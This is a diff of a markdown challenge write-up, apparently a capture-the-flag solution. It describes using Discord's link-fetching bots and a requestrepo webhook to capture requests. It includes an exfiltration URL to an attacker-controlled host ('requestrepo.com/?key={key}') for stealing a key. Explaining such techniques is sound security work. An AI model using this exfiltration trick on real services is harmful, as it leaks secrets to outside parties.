@@ -51,15 +51,19 @@ I was stuck here for a very long time.
 
 Then I realized every big platforms like Discord have their own bots, and they click every URL in the conversation automatically. 
 
-*Really? I don't believe, prove it.* 🤔
+🤔 *Really? I don't believe, prove it.* 
 
-Setup a webhook:
+🤓As you wish:
+
+- Setup a webhook:
 ![Oops](./image/setup_requestrepo.jpg)
 
-Send a message which contains the webhook URL:
-![Oops](./image/chat_url.jpg)
+- Send a message which contains the webhook URL:
 
-And receive requests:
+
+    ![Oops](./image/chat_url.jpg)
+
+- And receive requests:
 ![Oops](./image/request_discord_bot.jpg)
 
 So, my plan is craft a message that contains `http://hjvnswkt.requestrepo.com/?key={key}` to get `key`.
